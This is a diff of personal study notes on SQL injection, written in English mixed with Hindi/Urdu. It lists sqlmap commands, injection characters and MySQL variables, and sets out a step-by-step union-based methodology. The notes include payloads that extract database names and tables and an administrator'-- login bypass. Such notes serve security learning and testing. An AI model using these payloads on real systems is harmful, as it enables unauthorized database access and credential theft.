@@ -1,20 +1,97 @@
+-------------------------------- imp writeup -------------------------
+https://www.exploit-db.com/papers/13045          
+https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#SyntaxBasicAttacks 
 
-https://www.exploit-db.com/papers/13045          --- imp writeup
-sql injection 
 
-tools 
+http://www.securityidiots.com/Web-Pentest/SQL-Injection/DIOS-the-SQL-Injectors-Weapon-Upgraded.html 
+
+ye upar wale me link me payloads ye iska in one shot hack hota he reference ke liye musab khan ka video 
+------------------------ writeup end ---------------------
+
+
+
+
+
+-----------------------------------tools  ---------------------------------
 sql map 
+sqlmap -u "url"           -u flag ke age url dalneka 
+sqlmap -u "url" --cookie      cookie value add karne ka to login me problem nahi ayegi
+sqlmap -u "url" --dbs        database ka list milega 
 
 
+
+-------------------------------------tools end ---------------------------
+
+SQL Injection Characters
+
+1	 Character String Indicators	  ‘ or “
+2	 Multiple-line comment	       /*….*/
+3	 Addition, concatenate          ( or space   in URL)	+
+4	 Single-line comment	          # or – -(hyphen hyphen)
+5	 Double pipe (concatenate)	        ||
+6	 Wildcard attribute indicator	         %
+7	 Local variable	                    @variable
+8	 Global variable	          @@variable
+9	 Time delay	 waitfor delay         ’00:00:10’
+10	String instead of a number or vice versa	
+
+
+Since we are using UNION operator to perform SQL INJECTION, this type of injection is called UNION BASED SQL INJECTION ( a type of ERROR BASED SQL INJECTION)
+Union Based SQL Injection
+
+Variable/function	Output
+user()	Current User
+database()	Current Database
+version()	Database Version
+schema()	Current Database
+UUID()	System UUID Key
+current_user()	Current User
+system_user()	Current System User
+session_user()	Session User
+@@hostname	Current Hostname
+@@tmpdir	Temporary Directory
+@@datadir	Data Directory
+@@version	Version of Database
+@@basedir	Base Directory
+@@GLOBAL.have_symlink	Check if the symlink is Enabled or Disabled
+@@GLOBAL.have_ssl	Check if it SSL is available
+
+
+------------------------------ methodology for hunting -----------
 first find a place where database are used like in our login page we used database for checking
 username and password 
 
 in input field put sql symbols  
-' " order_by and like this see any error is coming or not  
+', ", order_by and like this see any error is coming or not 
 
-some usefule sql command for injection 
+error aya to samaje ne ka sql he  
 
---  start of the comments 
+order by 1 2 3 ye command dalke kitne columns he dekhneka 
+
+uske badd union based attack chalu karneka uska command - union select 1 2 3
+
+fir ek wrong value dalneka link id=-1 to vo skip hoga agle vale cloumn ka op milega
+
+payload == artist=-1 union select 1,database(),3    isse databse ka nam samjega
+
+payload == artist=-1 union select 1,version(),current_user()      version samjega
+
+payload == artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1  
+#table ka nam samjega ye payload se 
+
+
+UNION based attack 	- sql me union command rahtha he usko use karke 
+attack karne ka 
+
+
+
+
+
+
+
+some useful sql command for injection 
+
+--  #  tp comment the rest of the query
 OR Either of the input should be true
 AND  both of the input  should be true 
 1=1  A statement is always true
@@ -28,6 +105,19 @@ SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
 if we put the username and add -- comment to password is eliminated automatically 
 
 administrator'--     === payload 
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
